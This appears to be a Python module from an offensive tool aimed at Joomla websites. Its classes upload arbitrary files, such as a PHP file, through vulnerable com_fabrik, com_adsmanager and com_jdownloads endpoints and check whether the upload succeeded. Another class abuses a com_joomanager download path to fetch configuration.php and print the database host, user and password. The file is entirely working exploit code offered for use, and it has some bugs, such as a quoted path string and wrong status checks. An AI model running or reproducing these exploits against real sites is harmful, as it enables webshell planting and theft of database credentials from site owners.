#-*- coding: utf-8 -*-
import requests,re
from .color import R,G,B,Y,W

class com_fabrik:

      def joomla_com_fabrik(self,target,path,name):
          self.target = target
          self.path = path
          self.name = name
          requests.post(
                        f"{self.target}/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=",
                        data={
                                "name": "me.php",
                                "drop_data": "1",
                                "overwrite": "1",
                                "field_delimiter": ",",
                                "text_delimiter": "&quot;",
                                "option": "com_fabrik",
                                "controller": "import",
                                "view": "import",
                                "task": "doimport",
                                "Itemid": "0",
                                "tableid": "0"
                               },
                         files={'userfile':(self.name,open(f"self.path","rb"),"multipart/form-data")}               
                                          
          )
          cek = requests.get(f"{self.target}/media/{self.name}")
          if cek == 200:
             print(f"{G}[*]{W} Success : {self.target}/media/{self.name}")
          else:
             print("{R}[x]{W} Failed Not Vulnerability")

class com_ads_manager:

      def joomla_com_ads_manager(self,target,path,name):
          self.target = target
          self.path = path
          self.name = name
          requests.post(
                        f"{self.target}/index.php?option=com_adsmanager&task=upload&tmpl=component",
                        data={'name':self.name},
                        files={'file':open(self.path,'rb')}
          )
          cek = requests.get(f"{self.target}/tmp/plupload/{self.name}")
          if cek == 200:
             print("{G}[*]{W} Success : {self.target}/tmp/plupload/{self.name}")
          else:
             print("{R}[x]{W} Not Vulnerability")

class joomanager_config:

      def joomla_manager_get_config(self,target):
          self.target = target
          resp = requests.get(
                              f"{self.target}/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
          ).text
          if 'JConfig'in resp:
              print('[+] Vulnerability ')
              host = re.findall("host = '(.*)';",resp)
              user = re.findall("user = '(.*)';",resp)
              pwd = re.findall("password = '(.*)';",resp)
              db = re.findall("db = '(.*)';",resp)
              print(f"{G}[*]{W} Vulnerability")
              print(f"Host : {host}\nUser : {user}\nPassword : {pwd}\nDB : {db}")
          else:
              print(f'{R}[x]{W} Not vulnerability')

class com_jdownload:

      def joomla_com_jdownloads_file_upload(
                                            self,
                                            target,
                                            path,
                                            name,
                                            email,
                                            description
                                            ):
          self.target = target
          self.path = path
          self.name = name
          self.email = email
          self.description = description
          requests.post(
                        f"{self.target}/index.php?option=com_jdownloads&Itemid=0&view=upload",
                        data={
                         'name': self.name,
                         'mail': self.email,
                         'catlist': '1',
                         'filetitle': "407 AEX",
                         'description': "<p>407 Aex</p>",
                         '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                         'send': 1,
                         'senden': "Send file",
                         'description': self.description,
                         'option': "com_jdownloads",
                         'view': "upload"
                         },
                         files={
                                'file_upload':(self.name,open(self.path,'rb'),'multipart/form-data'),
                                'pic_upload':('407',open(self.path,'rb'),'multipart/form-data')
                         }
          )
          cek = requests.get(f"{self.target}/images/jdownloads/screenshots/{self.name}")
          if cek.status_code == 200:
             print(f"{G}[*]{W} Success : {self.target}/images/jdownloads/screenshots/{self.name}")
          else:
             print(f"{R}[x]{W} Failed ! Not Vulnerability ")
    













         
